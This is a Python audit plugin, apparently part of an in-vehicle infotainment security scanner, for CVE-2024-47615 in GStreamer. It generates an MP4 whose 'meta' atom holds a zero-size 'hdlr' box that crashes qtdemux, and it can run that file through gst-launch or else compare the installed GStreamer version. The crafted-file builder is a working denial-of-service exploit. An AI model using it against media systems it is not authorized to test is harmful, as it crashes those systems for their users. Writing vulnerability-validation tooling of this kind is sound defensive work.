#!/usr/bin/env python3
"""CVE-2024-47615 – GStreamer null pointer dereference in MP4/QTFF meta atom parsing.

Public PoC reference: https://gitlab.freedesktop.org/gstreamer/gstreamer/-/issues/3850
Technique:
  qtdemux_parse_container() in gst/isomp4/qtdemux.c processes the 'meta' atom.
  If the first 4 bytes of the 'meta' atom body happen to look like a size field
  equal to the full atom size, the code peeks at a nested atom before checking
  whether the remaining data buffer is non-NULL.
  A crafted meta atom with a nested 'hdlr' of size 0 → NULL pointer dereference.

Attack surface: USB MP4 in IVI, HTTP media streaming.
"""
from __future__ import annotations

import struct
import tempfile
from pathlib import Path

import sys as _sys, subprocess as _subproc, re as _re
from pathlib import Path as _Path
_sys.path.insert(0, str(_Path(__file__).parent))
from probe_utils import version_in_range, detection_confidence
from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 22,
    "cve": "CVE-2024-47615",
    "year": 2024,
    "domain": "application",
    "vendor_product": "GStreamer (gst-plugins-good isomp4)",
    "component": "qtdemux.c qtdemux_parse_container / meta atom",
    "type": "Null pointer dereference → DoS",
    "summary": (
        "A crafted MP4 'meta' atom containing a zero-size 'hdlr' sub-atom "
        "causes a NULL pointer dereference in qtdemux_parse_container, "
        "crashing the GStreamer pipeline."
    ),
    "source_url": "https://gitlab.freedesktop.org/gstreamer/gstreamer/-/issues/3850",
    "requires_manual_review": False,
    "affected": [{"vendor": "GStreamer", "product": "GStreamer", "versions": [{"version": "<1.24.9", "status": "affected"}]}],
}


def _make_box(tag: bytes, payload: bytes) -> bytes:
    return struct.pack('>I', 8 + len(payload)) + tag + payload


def _build_malformed_meta_mp4() -> bytes:
    """
    Build MP4 with 'meta' atom containing a zero-size 'hdlr' sub-atom.
    size=0 for hdlr causes qtdemux to attempt accessing a NULL GstBuffer.
    """
    ftyp = _make_box(b'ftyp', b'isom' + struct.pack('>I', 0) + b'isom')

    # hdlr with size = 0 (triggers NPD)
    hdlr_zero = struct.pack('>I', 0) + b'hdlr'

    # meta atom: 4-byte version/flags + malformed hdlr
    meta_payload = struct.pack('>I', 0) + hdlr_zero

    # meta needs to be under udta for qtdemux to process it
    udta = _make_box(b'udta', _make_box(b'meta', meta_payload))
    mvhd = _make_box(b'mvhd', struct.pack('>IIIIII', 0, 0, 0, 0x3e8, 0x3e8, 0x10000) +
                     b'\x00' * 76 + struct.pack('>I', 2))
    moov = _make_box(b'moov', mvhd + udta)
    mdat = _make_box(b'mdat', b'\x00' * 8)
    return ftyp + moov + mdat


def _run_poc(plugin):
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    stream = _build_malformed_meta_mp4()
    out = Path(tempfile.mkdtemp()) / "cve_2024_47615_meta_npd.mp4"
    out.write_bytes(stream)

    evidence = {
        "cve": "CVE-2024-47615",
        "mp4_path": str(out),
        "mp4_size_bytes": len(stream),
        "trigger": "meta/hdlr box with size=0 → NULL ptr dereference in qtdemux_parse_container",
        "impact": "GStreamer pipeline crash (DoS)",
    }

    if allow_disruptive:
        import subprocess as _sp
        result = _sp.run(
            ["gst-launch-1.0", "filesrc", f"location={out}",
             "!", "qtdemux", "!", "fakesink"],
            capture_output=True, text=True, timeout=15,
        )
        evidence["local_test_rc"]  = result.returncode
        evidence["local_test_out"] = (result.stdout + result.stderr)[:500]
        evidence["crashed"] = result.returncode in (-11, -6, 139, 1) or \
                              "NULL" in (result.stdout + result.stderr) or \
                              "Segmentation" in (result.stdout + result.stderr)


    # ── Non-disruptive version probe ─────────────────────────────────────────
    _tool_out = ""
    try:
        _r = _subproc.run(
            'gst-inspect-1.0 --version', shell=True, capture_output=True, text=True, timeout=10
        )
        _tool_out = (_r.stdout + _r.stderr).strip()
    except Exception as _e:
        _tool_out = f"tool_error:{_e}"

    evidence["tool_version_output"] = _tool_out
    _ver_m = _re.search('GStreamer (\\d+\\.\\d+\\.\\d+)', _tool_out)
    _detected_ver = _ver_m.group(1) if _ver_m else None
    evidence["detected_version"] = _detected_ver

    if _detected_ver:
        _in_range = version_in_range(_detected_ver, lt='1.24.9')
        evidence["version_in_affected_range"] = _in_range
    else:
        _in_range = None
        evidence["version_detection"] = "tool not found or version not parseable"

    # ── Disruptive crash test ─────────────────────────────────────────────────
    _crash_confirmed = False
    if allow_disruptive:
        # (existing crash-test code above already populated evidence["crashed"])
        _crash_confirmed = evidence.get("crashed", False)

    # ── Verdict ───────────────────────────────────────────────────────────────
    if _crash_confirmed:
        _level = "A"
        _vuln  = True
    elif _in_range is True:
        _level = "C"
        _vuln  = True
    elif _in_range is False:
        _level = "C"
        _vuln  = False
    else:
        _level = "E"
        _vuln  = None

    evidence["poc_source"] = 'GStreamer gitlab issue #3850 / CVE-2024-47615'
    return {
        "vulnerable": _vuln,
        "evidence": evidence,
        "requires_manual_review": _vuln is None,
        "detection_confidence": detection_confidence(
            _level, evidence,
            "crash_confirmed" if _crash_confirmed else
            ("version_range" if _in_range is not None else "passive_only")
        ),
    }



class Poc76CVE202447615GstreamerMetaHdlrNullPtrDerefDosAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50"
    meta_display_id = "POC-APP-076"
    meta_poc_name   = 'CVE-2024-47615 空指针解引用 DoS Active Validation'
    meta_cve_id     = "CVE-2024-47615"
    meta_severity   = "High"
    meta_protocol   = "local"
    meta_target_os  = ["linux", "android"]
    meta_required_params = []
    meta_optional_params = ["allow_disruptive"]
    meta_profiles   = ["application"]
    meta_source_url = "https://gitlab.freedesktop.org/gstreamer/gstreamer/-/issues/3850"
    meta_references       = ['https://gitlab.freedesktop.org/gstreamer/gstreamer/-/issues/3850']
    meta_attack_surface = "GStreamer isomp4 meta/hdlr zero-size box NULL deref DoS"
    is_disruptive   = True
    meta_destructive_level = "ServiceDisruption"

    def check_prerequisites(self) -> bool:
        """基础前提条件检查。"""
        if not self.target_ip or self.target_ip == "N/A":
            self.logger.error("未指定目标 IP。")
            return False
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "76_GStreamer_Null_pointer_dereference_media_parser_DoS_Audit") if "VULN" in dir() else "76_GStreamer_Null_pointer_dereference_media_parser_DoS_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc76CVE202447615GstreamerMetaHdlrNullPtrDerefDosAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
